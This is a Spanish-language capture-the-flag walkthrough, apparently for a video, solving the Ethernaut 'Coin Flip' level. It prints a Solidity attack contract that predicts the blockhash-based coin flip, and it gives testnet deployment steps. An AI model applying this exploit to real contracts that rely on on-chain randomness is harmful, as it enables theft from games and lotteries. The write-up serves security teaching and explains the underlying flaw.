# Coin Flip

> Estas son las instrucciones en las que se basan este vídeo:

<p align="center">
  <a href="https://www.youtube.com/watch?v=rAgEkEax7ec">
    <img src="https://img.youtube.com/vi/rAgEkEax7ec/hqdefault.jpg" alt="Link al video de Youtube">
  </a>
</p>

El **objetivo es adivinar el resultado correcto diez veces seguidas**. Ahora, obtenemos una nueva instancia del contrato confirmando la transacción en nuestra billetera de _MetaMask_. Mientras se despliega, copiamos el código del contrato y lo pegamos en **Remix**.

## Análisis

Cómo el objetivo es conseguir diez aciertos consecutivos, nos fijamos en la variable `consecutiveWins`, que se establece a cero en el `constructor` y después se incrementa en la función `flip()`. Es decir, se suma uno cuándo el valor que introducimos nosotros y el valor que se ha generado es el mismo.

Para solucionar este reto, vamos a copiar esta parte de código **que se encarga de crear el valor que queremos adivinar** y vamos a crear otro contrato que llamará a la función `flip()` **10 veces con el mismo valor**. De esta manera siempre acertaremos.

## Ataque

En el mismo fichero, vamos a crear un nuevo contrato llamado `CoinFlipAttack` y declaramos la dirección del contrato que queremos atacar:

```solidity
contract CoinFlipAttack {
	CoinFlip private immutable target;
}
```

Después, estableceremos esta dirección en el `constructor`.

```solidity
	constructor(address _target) {
			target = CoinFlip(_target);
			}
```

Para obtener el número correcto, vamos a copiar todo el código que calcula este número y lo pegamos en una función nueva:

```solidity
function _guess() private view returns (bool) {
		uint256 blockValue = uint256(blockhash(block.number - 1));
		uint256 coinFlip = blockValue / FACTOR;
		bool side = coinFlip == 1 ? true : false;
		return side;
}
```

También tenemos que copiar la variable `FACTOR` a nuestro contrato para que funcione el cálculo.

```solidity
 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

Ahora vamos a declarar la función `flip()` que vamos a llamar diez veces. De esta forma, estamos llamando a la función `flip()` del contrato original **pasándole como parámetro el número correcto**. Además, nos aseguraremos de que el número es el correcto para no perder la racha.

```solidity
function flip() external {
		bool guess = _guess();
		require(target.flip(guess), "fail");
}
```

Cuándo llamemos a esta función `flip()`, **se calculará el número correcto en ambos contratos**, ya que tienen **la misma lógica así que siempre acertaremos**.

## Uso

Una vez hayamos terminado de programar nuestro contrato de ataque, **lo compilamos** para comprobar que está bien. En la sección de despliegue, seleccionamos el entorno de _MetaMask_ en la red de _Sepolia_ y el contrato. Este _Smart Contract_ necesita recibir la dirección del objetivo así que **pegamos la dirección de la instancia de este contrato** y lo desplegamos confirmando la transacción.

Antes de llamar a la función `flip()` 10 veces, vamos a cargar el contrato original para ver el progreso. Seleccionamos el contrato original y pegamos la dirección en _At Address_ para poder interactuar con él desde **Remix**. De esta manera, podemos ver cuántos aciertos consecutivos llevamos, que de momento es **cero**.

Ahora sí, en el contrato de ataque, llamamos a la función `flip()` y confirmamos la transacción. Una vez se haya confirmado, consultamos los aciertos y si hemos hecho todo bien, ha cambiado a uno!. Entonces llamamos a esta función 10 veces…

Finalmente, llevamos una racha de 11 y es momento de entregar este nivel de **Ethernaut**!

Cómo nos dice Ethernaut, generar números aleatorios en _Solidity_ **es complicado**, porque todo en un _Smart Contract_ es público e **incluso los mineros podrían manipular el resultado final** si se basa en el _Hash_ del bloque o su _Timestamp_.
